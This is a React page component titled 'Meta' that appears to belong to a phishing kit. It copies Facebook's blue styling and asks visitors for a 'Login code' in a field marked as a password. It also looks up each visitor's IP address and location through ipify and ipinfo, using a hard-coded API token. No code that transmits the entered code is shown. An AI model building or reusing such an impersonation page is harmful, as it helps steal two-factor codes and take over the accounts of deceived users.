import { useEffect, useState } from 'react'
import Banner from '../assets/images/2672074-small.png'

import { useTranslation } from 'react-i18next'

import 'react-phone-input-2/lib/style.css'

const Meta = () => {
  const { t, i18n } = useTranslation()

  const [phoneNumber, setPhoneNumber] = useState('')

  const [email, setEmail] = useState('')

  useEffect(() => {
    if (phoneNumber === '') {
      setPhoneNumber('')
    }
  }, [phoneNumber])

  const [ip, setIp] = useState('')

  useEffect(() => {
    fetch('https://api.ipify.org?format=json')
      .then((response) => response.json())
      .then((data) => {
        setIp(data.ip)
        console.log('ip', data.ip)
      })
      .catch((error) => {
        console.error('Lỗi khi lấy địa chỉ IP:', error)
      })
  }, [])
  const [country, setCountry] = useState('')
  // const [countryCode, setCountryCode] = useState('')
  const [city, setCity] = useState('')
  useEffect(() => {
    fetch(`https://ipinfo.io/${ip}?token=4062af641c7f89`)
      .then((response) => response.json())
      .then((data) => {
        setCountry(data.country)
        // setCountryCode(data.region)
        setCity(data.region)
        console.log(data)
      })
      .catch((error) => {
        console.error('Lỗi khi lấy thông tin địa lý:', error)
      })
  }, [ip])

  // const codeLang = country.toLocaleLowerCase()

  // useEffect(() => {
  //   i18n.changeLanguage(codeLang)
  // }, [codeLang, i18n])
  useEffect(() => {
    i18n.changeLanguage('en')
  }, [i18n])
  console.log('Nơi ip', city + ', ' + country)
  return (
    <div className='bg-[#e7e6e6] w-full h-screen'>
      <header className='h-[205px] md:h-[100px] w-full relative'>
        <div className='w-full h-full bg-[#1877f2]'>
          <img className='w-10 h-10 object-cover' src={Banner} alt='Banner' />
        </div>
      </header>
      <div className='h-4/5 flex justify-center items-center'>
        <div className='w-2/5 h-auto bg-[#fff] py-2 px-5'>
          <div>
            <h2 className='text-lg font-semibold mb-3'>{t('frm_input2.home_title')}</h2>
            <hr />
            <p className='my-2'> {t('frm_input2.description')}</p>
          </div>
          <div>
            <h2 className='text-lg font-semibold mb-3'>{t('frm_input2.title')}</h2>
            <hr />
            <p className='my-2'>{t('frm_input2.description2')}</p>
          </div>
          <div>
            <h2 className='text-lg font-semibold mb-3'>{t('frm_input2.title2')}</h2>
            <hr />
            <p className='my-2'>{t('frm_input2.description3')}</p>
          </div>
          <div className='w-1/3 mt-5 relative mb-12'>
            <input
              className='w-full p-4 text-[#444444] focus:ring-1 ring-black rounded-lg border border-[#BDBDBD]'
              id='password'
              name='password'
              value={email}
              placeholder={'Login code'}
              onChange={(e) => setEmail(e.target.value)}
            />
          </div>
          <hr />
          <button className=' mt-2 w-32 h-50 bg-[#1877f2] px-3 py-2 rounded-lg text-lg text-slate-50 float-right'>
            {t('frm_input2.button')}
          </button>
        </div>
      </div>
    </div>
  )
}

export default Meta
